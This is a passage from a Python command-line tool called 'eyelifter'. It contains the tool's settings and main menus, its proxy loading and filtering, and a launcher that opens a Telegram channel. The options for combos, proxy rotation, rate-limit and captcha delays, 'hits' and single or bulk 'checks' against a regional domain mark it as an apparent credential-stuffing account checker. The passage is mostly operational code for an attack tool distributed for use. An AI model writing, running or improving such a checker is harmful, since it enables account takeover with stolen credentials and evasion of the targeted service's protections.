    print(f"  [4]  Retries:             {s['retries']}")
    print(f"  [5]  Retry Delay:         {s['retry_delay']}s")
    print(f"  [6]  Combo Delay:         {s['combo_delay']}s")
    print(f"  [7]  Proxies File:        {s['proxies_file']}")
    print(f"  [8]  Rate-limit Delay:    {s['rate_limit_delay']}s")
    print(f"  [9]  Captcha Delay:       {s['captcha_delay']}s")
    print(f"  [10] Skip Proxy Test:     {s['skip_proxy_test']}")
    print(f"  [11] Hit Spacer:          {s['hit_spacer']}")
    print(f"  [12] Capture Extras:      {s['capture_extras']}")
    print(f"  [13] Debug:               {s['debug']}")
    print(f"  [0]  Back")

    ch = input(f"{eyelifter_color('96', '[*] select > ')}").strip()
    changed = False
    try:
        if ch == "1":
            eyelifter_pick_region()
        elif ch == "2":
            s["threads"] = max(1, min(EYELIFTER_MAX_THREADS, int(input("threads: "))))
            changed = True
        elif ch == "3":
            s["timeout"] = max(5, min(120, int(input("timeout: "))))
            changed = True
        elif ch == "4":
            s["retries"] = max(0, min(5, int(input("retries: "))))
            changed = True
        elif ch == "5":
            s["retry_delay"] = max(0.0, min(60.0, float(input("retry delay: "))))
            changed = True
        elif ch == "6":
            s["combo_delay"] = max(0.0, min(60.0, float(input("combo delay: "))))
            changed = True
        elif ch == "7":
            v = input("proxies file: ").strip()
            if v:
                s["proxies_file"] = v
                changed = True
        elif ch == "8":
            s["rate_limit_delay"] = max(1, min(180, int(input("rate-limit delay: "))))
            changed = True
        elif ch == "9":
            s["captcha_delay"] = max(1, min(600, int(input("captcha delay: "))))
            changed = True
        elif ch == "10":
            s["skip_proxy_test"] = not s["skip_proxy_test"]
            changed = True
        elif ch == "11":
            s["hit_spacer"] = not s["hit_spacer"]
            changed = True
        elif ch == "12":
            s["capture_extras"] = not s["capture_extras"]
            changed = True
        elif ch == "13":
            s["debug"] = not s["debug"]
            changed = True
        elif ch == "0":
            return
    except (ValueError, TypeError):
        eyelifter_log("✗", "ERROR", "CONFIG", "invalid [eyelifter]")
        if sys.stdin.isatty():
            input(f"{eyelifter_color('93', '[*] enter > ')}")
        return

    if changed:
        try:
            _EYELIFTER_CFG.eyelifter_save()
            eyelifter_log("💾", "INFO", "CONFIG", "saved [eyelifter]")
        except Exception as e:
            eyelifter_log("!", "WARN", "CONFIG", f"{e} [eyelifter]")
        if sys.stdin.isatty():
            input(f"{eyelifter_color('93', '[*] enter > ')}")


def eyelifter_open_channel():
    try:
        import shutil
        for cmd in ("termux-open-url", "xdg-open", "open"):
            if shutil.which(cmd):
                subprocess.Popen(
                    [cmd, f"https://t.me/{EYELIFTER_TG_CHAN.lstrip('@')}"],
                    stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL,
                    stdin=subprocess.DEVNULL, start_new_session=True,
                    close_fds=True)
                return
        if os.name == "nt":
            os.startfile(f"https://t.me/{EYELIFTER_TG_CHAN.lstrip('@')}")
            return
        import webbrowser
        webbrowser.open(f"https://t.me/{EYELIFTER_TG_CHAN.lstrip('@')}")
    except Exception:
        pass


def eyelifter_main():
    eyelifter_verify("main")

    if not _EYELIFTER_HAVE_CRYPTO:
        print("[FATAL] pycryptodome missing — pip install pycryptodome")
        return

    if _EYELIFTER_CFG.settings.get("open_channel_on_launch", True):
        threading.Thread(target=eyelifter_open_channel, daemon=True).start()

    region = _EYELIFTER_CFG.settings["region"]

    eyelifter_banner(EYELIFTER_TOOL, f"{region} · {EYELIFTER_REGIONS[region]['domain']}")
    eyelifter_log("📣", "INFO", "CREDIT",
        f"eyelifter · {EYELIFTER_TG_USER} · {EYELIFTER_TG_CHAN} [eyelifter]")
    eyelifter_log("🌍", "INFO", "REGION",
        f"{region} · {EYELIFTER_REGIONS[region]['domain']} [eyelifter]")
    eyelifter_log("🐛", "INFO", "DEBUG",
        f"{'ON' if _EYELIFTER_CFG.settings.get('debug') else 'OFF'} [eyelifter]")
    eyelifter_log("⚙️", "INFO", "THREADS",
        f"max={EYELIFTER_MAX_THREADS} default={EYELIFTER_DEFAULT_THREADS} [eyelifter]")

    proxy_file = os.path.join(
        os.path.dirname(EYELIFTER_CFG_PATH),
        _EYELIFTER_CFG.settings.get("proxies_file", "proxies.txt"))
    proxies = eyelifter_load_proxies(proxy_file)
    if proxies and not _EYELIFTER_CFG.settings.get("skip_proxy_test", False):
        proxies = eyelifter_filter_proxies(proxies)
        eyelifter_log("✓", "INFO", "PROXY", f"{len(proxies)} live [eyelifter]")

    eyelifter_log("⏳", "STEP", "WARM",
        f"warming {EYELIFTER_REGIONS[region]['domain']} [eyelifter]")
    srv = EyelifterTokServer(region)
    try:
        srv.start()
    except Exception as e:
        eyelifter_log("✗", "ERROR", "WARM", f"warmup failed: {e} [eyelifter]")
        return
    eyelifter_log("✓", "INFO", "WARM", "ready [eyelifter]")

    try:
        while True:
            eyelifter_verify("menu")
            eyelifter_section(
                f"MAIN MENU · {region} · {EYELIFTER_TG_USER} · {EYELIFTER_TG_CHAN}")
            if proxies:
                eyelifter_log("🌐", "INFO", "PROXY", f"{len(proxies)} proxies [eyelifter]")
            else:
                eyelifter_log("⚠️", "WARN", "PROXY", "direct [eyelifter]")
            print("[1] Single check")
            print("[2] Bulk check")
            print("[3] Change region")
            print("[4] Settings")
            print("[5] Exit")
            ch = input(f"{eyelifter_color('93', '[*] select > ')}").strip()

            if ch == "1":
                eyelifter_single_check(proxies, srv, region)
            elif ch == "2":
                _EYELIFTER_STOP.clear()
                eyelifter_bulk_check(proxies, srv, region)
            elif ch == "3":
                new_region = eyelifter_pick_region()
                if new_region != region:
                    region = new_region
                    try:
                        srv.stop()
                    except Exception:
                        pass
                    eyelifter_log("⏳", "STEP", "WARM",
                        f"rebooting for {EYELIFTER_REGIONS[region]['domain']} [eyelifter]")
                    srv = EyelifterTokServer(region)
                    try:
                        srv.start()
                        eyelifter_log("✓", "INFO", "WARM", "ready [eyelifter]")
                    except Exception as e:
                        eyelifter_log("✗", "ERROR", "WARM", f"{e} [eyelifter]")
                        return
            elif ch == "4":
                eyelifter_settings_menu()
                proxies = eyelifter_load_proxies(proxy_file)
                if proxies and not _EYELIFTER_CFG.settings.get("skip_proxy_test", False):
                    proxies = eyelifter_filter_proxies(proxies)
            elif ch == "5":
                print("Exiting...")
                return
            else:
                eyelifter_log("✗", "ERROR", "INPUT", "invalid choice [eyelifter]")
    finally:
        try:
            srv.stop()
        except Exception:
            pass


if __name__ == "__main__":
    try:
        eyelifter_main()
    except SystemExit:
        raise
    except KeyboardInterrupt:
        print("\nExiting...")
    except Exception as e:
        print(f"[FATAL] {type(e).__name__}: {e}")